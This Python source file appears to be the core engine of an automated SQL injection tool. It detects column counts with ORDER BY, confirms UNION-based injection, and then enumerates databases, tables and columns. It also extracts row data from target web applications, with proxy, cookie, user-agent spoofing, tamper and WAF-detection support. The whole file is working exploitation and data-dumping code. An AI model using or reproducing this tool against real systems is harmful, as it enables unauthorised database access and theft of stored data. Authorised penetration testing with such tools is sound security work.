"""
Main SQL injection scanner engine.
"""
import requests
import time
import re
from typing import Dict, List, Optional, Tuple, Callable
from concurrent.futures import ThreadPoolExecutor, as_completed
from .payloads import PayloadGenerator, PayloadVariants
from .utils import URLBuilder, ResponseAnalyzer, PayloadTester, RateLimiter, WAFDetector


class SQLiScanner:
    """Main SQL injection scanner."""
    
    def __init__(self, url: str, param: str, method: str = 'GET', 
                 timeout: int = 10, tamper_options: List[str] = None,
                 proxy: Optional[str] = None, cookies: Optional[str] = None,
                 user_agent: Optional[str] = None, custom_headers: Optional[Dict] = None,
                 progress_callback: Optional[Callable] = None):
        """Initialize scanner."""
        self.url = url
        self.param = param
        self.method = method.upper()
        self.timeout = timeout
        self.tamper_options = tamper_options or []
        self.proxy = proxy
        self.cookies = cookies
        self.user_agent = user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        self.custom_headers = custom_headers or {}
        self.progress_callback = progress_callback
        
        self.payload_gen = PayloadGenerator(self.tamper_options)
        self.rate_limiter = RateLimiter(requests_per_second=1.0)
        
        self.session = self._create_session()
        self.results = {
            'vulnerable': False,
            'dbms': None,
            'current_db': None,
            'databases': [],
            'tables': {},
            'columns': {},
            'data': {},
            'errors': [],
            'waf_detected': None,
        }
    
    def _create_session(self) -> requests.Session:
        """Create requests session with custom configuration."""
        session = requests.Session()
        
        # Set headers
        headers = {
            'User-Agent': self.user_agent,
        }
        headers.update(self.custom_headers)
        session.headers.update(headers)
        
        # Set proxy if provided
        if self.proxy:
            session.proxies = {
                'http': self.proxy,
                'https': self.proxy,
            }
        
        # Set cookies if provided
        if self.cookies:
            session.headers['Cookie'] = self.cookies
        
        return session
    
    def _log_progress(self, message: str, level: str = 'info'):
        """Log progress message."""
        if self.progress_callback:
            self.progress_callback({
                'message': message,
                'level': level,
                'timestamp': time.time(),
            })
    
    def _make_request(self, url: str, data: Dict = None, params: Dict = None) -> Tuple[Optional[str], int, float]:
        """Make HTTP request with rate limiting."""
        self.rate_limiter.wait()
        
        try:
            start_time = time.time()
            
            if self.method == 'GET':
                response = self.session.get(url, params=params, timeout=self.timeout)
            else:
                response = self.session.post(url, data=data, timeout=self.timeout)
            
            elapsed = time.time() - start_time
            
            # Check for WAF
            waf = WAFDetector.detect(response.text, response.status_code)
            if waf and not self.results['waf_detected']:
                self.results['waf_detected'] = waf
                self._log_progress(f"⚠️ WAF Detected: {waf}", 'warning')
            
            return response.text, response.status_code, elapsed
        
        except requests.Timeout:
            self._log_progress("❌ Request timeout", 'error')
            return None, 0, 0
        except Exception as e:
            self._log_progress(f"❌ Request error: {str(e)}", 'error')
            return None, 0, 0
    
    def detect_columns(self, max_cols: int = 50) -> Optional[int]:
        """Detect number of columns using ORDER BY."""
        self._log_progress("🔍 Detecting number of columns...")
        
        for i in range(1, max_cols + 1):
            payload = self.payload_gen.generate_order_by_payload(self.url, self.param, i)
            
            if self.method == 'GET':
                test_url, _ = URLBuilder.inject_parameter(self.url, self.param, payload, 'GET')
                response, status, _ = self._make_request(test_url)
            else:
                response, status, _ = self._make_request(self.url, data={self.param: payload})
            
            if response is None or status != 200:
                # Found the limit
                self._log_progress(f"✓ Found {i-1} columns", 'success')
                return i - 1
        
        self._log_progress(f"⚠️ Could not determine exact column count, assuming {max_cols}", 'warning')
        return max_cols
    
    def detect_union_injection(self, num_cols: int) -> bool:
        """Detect UNION-based SQL injection."""
        self._log_progress("🔍 Testing UNION-based injection...")
        
        test_string = "UNIQTEST999"
        payload = self.payload_gen.generate_union_payload(self.url, self.param, num_cols, test_string)
        
        if self.method == 'GET':
            test_url, _ = URLBuilder.inject_parameter(self.url, self.param, payload, 'GET')
            response, status, _ = self._make_request(test_url)
        else:
            response, status, _ = self._make_request(self.url, data={self.param: payload})
        
        if response and test_string in response:
            self._log_progress("✓ UNION injection confirmed!", 'success')
            self.results['vulnerable'] = True
            return True
        
        self._log_progress("❌ UNION injection not detected", 'error')
        return False
    
    def extract_database_info(self) -> bool:
        """Extract current database and version."""
        self._log_progress("📊 Extracting database information...")
        
        # Get current database
        payload = self.payload_gen.generate_database_payload()
        if self.method == 'GET':
            test_url, _ = URLBuilder.inject_parameter(self.url, self.param, payload, 'GET')
            response, _, _ = self._make_request(test_url)
        else:
            response, _, _ = self._make_request(self.url, data={self.param: payload})
        
        if response:
            # Try to extract database name
            db_match = re.search(r'UNIQTEST999[^<]*?(\w+)', response)
            if db_match:
                self.results['current_db'] = db_match.group(1)
                self._log_progress(f"✓ Current database: {self.results['current_db']}", 'success')
        
        # Get version
        payload = self.payload_gen.generate_version_payload()
        if self.method == 'GET':
            test_url, _ = URLBuilder.inject_parameter(self.url, self.param, payload, 'GET')
            response, _, _ = self._make_request(test_url)
        else:
            response, _, _ = self._make_request(self.url, data={self.param: payload})
        
        if response:
            version_match = re.search(r'(\d+\.\d+\.\d+[^<]*)', response)
            if version_match:
                version = version_match.group(1)
                self.results['dbms'] = PayloadTester.detect_dbms(response, version)
                self._log_progress(f"✓ DBMS: {self.results['dbms']} ({version})", 'success')
        
        return True
    
    def extract_databases(self) -> List[str]:
        """Extract list of all databases."""
        self._log_progress("📚 Extracting database list...")
        
        payload = self.payload_gen.generate_schema_payload()
        if self.method == 'GET':
            test_url, _ = URLBuilder.inject_parameter(self.url, self.param, payload, 'GET')
            response, _, _ = self._make_request(test_url)
        else:
            response, _, _ = self._make_request(self.url, data={self.param: payload})
        
        databases = []
        if response:
            # Extract comma-separated database names
            db_match = re.search(r'UNIQTEST999[^<]*?([a-zA-Z0-9_,]+)', response)
            if db_match:
                databases = [db.strip() for db in db_match.group(1).split(',')]
                self.results['databases'] = databases
                self._log_progress(f"✓ Found {len(databases)} databases", 'success')
        
        return databases
    
    def extract_tables(self, database: str) -> List[str]:
        """Extract tables from database."""
        self._log_progress(f"📋 Extracting tables from {database}...")
        
        payload = self.payload_gen.generate_tables_payload(database)
        if self.method == 'GET':
            test_url, _ = URLBuilder.inject_parameter(self.url, self.param, payload, 'GET')
            response, _, _ = self._make_request(test_url)
        else:
            response, _, _ = self._make_request(self.url, data={self.param: payload})
        
        tables = []
        if response:
            table_match = re.search(r'UNIQTEST999[^<]*?([a-zA-Z0-9_,]+)', response)
            if table_match:
                tables = [t.strip() for t in table_match.group(1).split(',')]
                self.results['tables'][database] = tables
                self._log_progress(f"✓ Found {len(tables)} tables", 'success')
        
        return tables
    
    def extract_columns(self, database: str, table: str) -> List[str]:
        """Extract columns from table."""
        self._log_progress(f"📊 Extracting columns from {database}.{table}...")
        
        payload = self.payload_gen.generate_columns_payload(database, table)
        if self.method == 'GET':
            test_url, _ = URLBuilder.inject_parameter(self.url, self.param, payload, 'GET')
            response, _, _ = self._make_request(test_url)
        else:
            response, _, _ = self._make_request(self.url, data={self.param: payload})
        
        columns = []
        if response:
            col_match = re.search(r'UNIQTEST999[^<]*?([a-zA-Z0-9_,]+)', response)
            if col_match:
                columns = [c.strip() for c in col_match.group(1).split(',')]
                if database not in self.results['columns']:
                    self.results['columns'][database] = {}
                self.results['columns'][database][table] = columns
                self._log_progress(f"✓ Found {len(columns)} columns", 'success')
        
        return columns
    
    def extract_data(self, database: str, table: str, columns: List[str], 
                    limit: int = 50, offset: int = 0) -> List[Dict]:
        """Extract data from table."""
        self._log_progress(f"📥 Extracting data from {database}.{table}...")
        
        payload = self.payload_gen.generate_data_payload(database, table, columns, limit=limit, offset=offset)
        if self.method == 'GET':
            test_url, _ = URLBuilder.inject_parameter(self.url, self.param, payload, 'GET')
            response, _, _ = self._make_request(test_url)
        else:
            response, _, _ = self._make_request(self.url, data={self.param: payload})
        
        data = []
        if response:
            # Extract data rows
            data_match = re.search(r'UNIQTEST999[^<]*?([a-zA-Z0-9_:,\s]+)', response)
            if data_match:
                rows = data_match.group(1).split(',')
                for row in rows:
                    values = row.split(':')
                    if len(values) == len(columns):
                        data.append(dict(zip(columns, values)))
                
                if database not in self.results['data']:
                    self.results['data'][database] = {}
                self.results['data'][database][table] = data
                self._log_progress(f"✓ Extracted {len(data)} rows", 'success')
        
        return data
    
    def scan(self) -> Dict:
        """Run full scan."""
        self._log_progress("🚀 Starting SQL injection scan...", 'info')
        
        try:
            # Step 1: Detect columns
            num_cols = self.detect_columns()
            if not num_cols:
                self._log_progress("❌ Could not detect columns", 'error')
                return self.results
            
            # Step 2: Test UNION injection
            if not self.detect_union_injection(num_cols):
                self._log_progress("❌ Target does not appear vulnerable", 'error')
                return self.results
            
            # Step 3: Extract database info
            self.extract_database_info()
            
            # Step 4: Extract databases
            databases = self.extract_databases()
            
            # Step 5: Extract tables and columns for each database
            for db in databases[:3]:  # Limit to first 3 databases
                tables = self.extract_tables(db)
                for table in tables[:5]:  # Limit to first 5 tables
                    columns = self.extract_columns(db, table)
                    if columns:
                        self.extract_data(db, table, columns, limit=20)
            
            self._log_progress("✓ Scan completed successfully!", 'success')
        
        except Exception as e:
            self._log_progress(f"❌ Scan error: {str(e)}", 'error')
            self.results['errors'].append(str(e))
        
        return self.results
